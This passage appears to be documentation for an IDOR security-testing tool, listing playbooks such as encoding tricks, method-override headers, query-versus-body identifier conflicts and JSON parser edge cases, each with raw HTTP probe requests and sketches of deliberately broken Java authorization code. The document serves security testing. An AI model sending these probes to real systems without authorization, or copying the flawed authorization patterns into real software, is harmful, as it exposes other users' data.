GET /something/%7B550e8400-e29b-41d4-a716-446655440000%7D HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/ZGVmNDU2 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"%64%65%66%34%35%36"}
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"550e8400\u002de29b\u002d41d4\u002da716\u002d446655440000"}
```

### What The Broken Target Code Might Look Like

```java
String checkedId = request.rawPathParam("id");
denyIfForbidden(checkedId);

String routedId = urlDecode(request.rawPathParam("id"));
return objectService.load(routedId);
```

Null-byte suffixes like `%00` are covered separately by `idor.hybrid.trailing_control_characters`, so this playbook stays focused on encoding and normalization differences rather than control-character handling.

### `idor.hybrid.method_override`

Display name:
`Method Override`

### Purpose

This playbook exists because object-level authorization bugs often show up on update or delete paths even when the read path is denied, and some stacks honor method override headers inconsistently.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
HEAD /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
DELETE /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
X-HTTP-Method-Override: GET
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
X-Method-Override: DELETE
```

### What The Broken Target Code Might Look Like

```java
if ("GET".equals(request.method())) {
    requireOwnership(user, request.pathParam("id"));
}

return objectController.handle(request);
```

### `idor.hybrid.query_body_cross_source`

Display name:
`Query + Body Cross-Source`

### Purpose

This playbook exists because an auth check might read the identifier from the query string while the resolver reads from the request body (or vice versa). Many frameworks that accept GET requests will also parse a body if one is present, creating a cross-source disagreement.

### Raw HTTP Examples

```http
GET /users/profile?id=wiener HTTP/2
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"carlos"}
```

```http
POST /users/profile?id=wiener HTTP/2
Host: target.example
Cookie: session=user-session
Content-Type: application/x-www-form-urlencoded

id=carlos
```

```http
PUT /users/profile?id=carlos HTTP/2
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"wiener"}
```

Generates variants across 3 methods (GET, POST, PUT) × 3 body formats (JSON, URL-encoded, multipart) × both identifier directions, plus body-only variants with no query param.

### What The Broken Target Code Might Look Like

```java
// Auth reads query, resolver reads body
String checkedId = request.queryParam("id");
requireOwnership(user, checkedId);

JsonNode body = request.json();
return objectService.load(body.get("id").asText());
```

### `idor.body.json_edge_cases`

Display name:
`JSON Edge Cases`

### Purpose

This playbook exists because JSON parsers and object binders handle malformed input, type confusion, encoding tricks, and structural edge cases inconsistently. A comprehensive set of ~40 mutations is applied to the identifier field to probe parser-specific behaviors.

### Raw HTTP Examples

```http
POST /users/profile HTTP/2
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id" "carlos"}
```

```http
POST /users/profile HTTP/2
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id": true}
```

```http
POST /users/profile HTTP/2
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"ID":"carlos"}
```

```http
POST /users/profile HTTP/2
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"carlos\u200B"}
```

Covers: type confusion (boolean, null, number), malformed JSON (missing colon, extra comma, single quotes), case-sensitive keys, JSON injection in strings, environment variables (`${USER}`), structural edge cases (nested arrays, empty key, mixed-type arrays), Unicode (zero-width space/joiner, emoji), special characters (curly braces, backticks, plus, asterisk), and path traversal in value.

### What The Broken Target Code Might Look Like

```java
// Parser tolerates malformed JSON or coerces types
Object supplied = request.bindJsonLenient().get("id");
return objectService.load(supplied.toString());
```

```java
// Case-insensitive key lookup
String id = body.entries().stream()
    .filter(e -> e.getKey().equalsIgnoreCase("id"))
    .map(Map.Entry::getValue)
    .findFirst().orElse(null);
```
